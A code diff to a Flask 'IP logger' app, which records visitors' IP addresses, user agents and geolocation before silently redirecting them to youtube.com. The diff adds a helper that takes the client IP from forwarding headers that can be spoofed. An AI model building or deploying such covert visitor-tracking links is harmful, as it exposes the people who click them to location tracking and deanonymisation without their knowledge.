@@ -34,12 +34,22 @@ def get_geo(ip):
     except Exception:
         return None, None, None
 
+def get_client_ip():
+    # Check headers that may contain the real IP if behind a proxy
+    if 'X-Forwarded-For' in request.headers:
+        # Can be multiple IPs, take the first one
+        ip = request.headers['X-Forwarded-For'].split(',')[0].strip()
+    elif 'X-Real-IP' in request.headers:
+        ip = request.headers['X-Real-IP']
+    else:
+        ip = request.remote_addr
+    return ip
+
 @app.route('/')
 def index():
-    # The link you want to redirect users to after logging IP
-    redirect_url = 'https://youtube.com'
-    
-    ip = request.remote_addr
+    redirect_url = 'https://youtube.com'  # Change to your redirect target
+
+    ip = get_client_ip()
     user_agent = request.headers.get('User-Agent', 'Unknown')
     city, region, country = get_geo(ip)
     timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
@@ -76,3 +86,4 @@ def dashboard():
 if __name__ == '__main__':
     init_db()
     app.run(host='0.0.0.0', port=5000)
+
